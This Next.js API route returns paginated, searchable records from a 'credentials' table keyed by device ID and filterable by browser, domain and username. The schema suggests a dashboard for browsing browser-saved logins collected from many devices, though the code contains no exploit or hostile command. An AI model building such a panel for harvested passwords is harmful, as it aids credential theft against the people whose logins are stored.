import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"
import { sanitizeDeviceId, sanitizePaginationParams } from "@/lib/input-sanitization"

export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    // Sanitize device ID
    const deviceId = sanitizeDeviceId(params.deviceId)

    // Parse pagination and filter parameters
    const { searchParams } = new URL(request.url)
    const { limit, offset } = sanitizePaginationParams({
      limit: searchParams.get("limit") || undefined,
      offset: searchParams.get("offset") || undefined,
    })

    const browser = searchParams.get("browser") || ""
    const domain = searchParams.get("domain") || ""
    const searchQuery = searchParams.get("q") || ""

    // Build WHERE clause
    let whereClause = "WHERE device_id = ?"
    const queryParams: any[] = [deviceId]

    if (browser) {
      whereClause += " AND browser LIKE ?"
      queryParams.push(`%${browser}%`)
    }

    if (domain) {
      whereClause += " AND domain LIKE ?"
      queryParams.push(`%${domain}%`)
    }

    if (searchQuery) {
      whereClause += " AND (username LIKE ? OR url LIKE ? OR domain LIKE ?)"
      queryParams.push(`%${searchQuery}%`, `%${searchQuery}%`, `%${searchQuery}%`)
    }

    // Get total count
    const countResult = (await executeQuery(
      `SELECT COUNT(*) as total FROM credentials ${whereClause}`,
      queryParams
    )) as any[]

    const total = countResult[0]?.total || 0

    // Get credentials with pagination
    const credentials = (await executeQuery(
      `SELECT * FROM credentials
       ${whereClause}
       ORDER BY id DESC
       LIMIT ? OFFSET ?`,
      [...queryParams, limit, offset]
    )) as any[]

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      total,
      limit,
      offset,
      credentials,
    })
  } catch (error) {
    console.error("Error fetching device credentials:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch credentials",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 }
    )
  }
}
